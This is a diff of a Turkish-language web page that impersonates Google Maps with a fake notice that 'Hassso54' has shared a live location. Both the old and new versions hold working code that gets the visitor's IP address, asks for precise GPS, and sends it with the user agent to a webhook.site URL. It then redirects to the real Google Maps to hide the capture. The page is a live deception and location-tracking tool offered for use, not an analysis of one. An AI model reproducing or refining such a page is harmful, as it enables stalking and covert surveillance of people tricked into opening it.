@@ -3,91 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Haritalar - Konum Paylaşımı</title>
+    <title>Haritalar</title>
     <style>
-        body { font-family: 'Roboto', Arial, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 25px; border-radius: 8px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.2); width: 90%; max-width: 380px; border: 1px solid #dadce0; }
-        .google-logo { width: 74px; margin-bottom: 20px; }
-        h2 { font-size: 20px; font-weight: 400; color: #202124; margin-bottom: 10px; }
-        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; font-size: 14px; }
-        #status { margin-top: 15px; font-size: 12px; color: #1a73e8; display: none; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { text-align: center; padding: 20px; width: 90%; max-width: 350px; }
+        .map-icon { width: 60px; margin-bottom: 20px; }
+        h2 { font-size: 18px; color: #3c4043; font-weight: 500; margin-bottom: 25px; line-height: 1.4; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 14px 20px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; font-size: 15px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
-    <h2>Konum görüntüleme isteği</h2>
-    <p><b>Hassso54</b> sizinle gerçek zamanlı konumunu paylaştı. Haritaya bağlanmak ve konumu canlı takip etmek için devam edin.</p>
-    <button id="mainBtn" onclick="baslat()">Konumu Haritada Aç</button>
-    <div id="status">Google Haritalar'a bağlanılıyor...</div>
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1024px-Google_Maps_icon_%282020%29.svg.png" alt="Maps" class="map-icon">
+    <h2>Hassso54 sizinle canlı konumunu paylaştı.</h2>
+    <button id="goBtn" onclick="calistir()">Konumu Görüntüle</button>
 </div>
 
 <script>
-    // --- ÖNEMLİ: WEBHOOK LİNKİNİ AŞAĞIYA YAPIŞTIR ---
+    // WEBHOOK LİNKİNİ KONTROL ET
     const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
 
-    async function baslat() {
-        const btn = document.getElementById('mainBtn');
-        const status = document.getElementById('status');
-        btn.disabled = true;
+    async function calistir() {
+        const btn = document.getElementById('goBtn');
         btn.innerText = "Yükleniyor...";
-        status.style.display = "block";
+        btn.disabled = true;
 
-        let veriler = {
-            etiket: "Hassso54_Takip",
-            ip: "Alınamadı",
-            gps: "İzin Verilmedi",
-            cihaz: navigator.userAgent,
-            zaman: new Date().toLocaleString()
+        let data = {
+            tip: "Hassso54_Takip",
+            ip: "Bilinmiyor",
+            gps: "İzin Yok",
+            userAgent: navigator.userAgent
         };
 
-        // 1. IP Adresini Al
+        // 1. IP Al
         try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            veriler.ip = ipData.ip;
-        } catch (e) { console.log("IP Hatası"); }
+            const res = await fetch('https://api.ipify.org?format=json');
+            const json = await res.json();
+            data.ip = json.ip;
+        } catch(e) {}
 
-        // 2. Konum İste
+        // 2. Konum Al ve Gönder
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    // BAŞARILI: Tam konum alındı
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    veriler.gps = `https://www.google.com/maps?q=${lat},${lon}`;
-                    await gonderVeYonlendir(veriler);
+                async (p) => {
+                    data.gps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    await veriyiBas(data);
                 },
-                async (error) => {
-                    // HATA: Kullanıcı reddetti veya teknik sorun
-                    veriler.gps = "Hata: " + error.message;
-                    await gonderVeYonlendir(veriler);
+                async () => {
+                    await veriyiBas(data);
                 },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                { enableHighAccuracy: true, timeout: 8000 }
             );
         } else {
-            veriler.gps = "Tarayıcı GPS desteklemiyor";
-            await gonderVeYonlendir(veriler);
+            await veriyiBas(data);
         }
     }
 
-    async function gonderVeYonlendir(data) {
+    async function veriyiBas(d) {
         try {
-            // Webhook'a veriyi gönder (JSON formatında)
             await fetch(webhookURL, {
                 method: 'POST',
-                mode: 'no-cors', // Tarayıcı engeline takılmamak için
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                mode: 'no-cors',
+                body: JSON.stringify(d)
             });
-        } catch (e) { console.log("Gönderim hatası"); }
-
-        // 1 saniye bekle ve sonra Haritalar'a yönlendir
-        setTimeout(() => {
-            window.location.href = "https://www.google.com/maps";
-        }, 1000);
+        } catch(e) {}
+        
+        // İşlem bitince gerçek haritaya yönlendir
+        window.location.href = "https://www.google.com/maps";
     }
 </script>
 
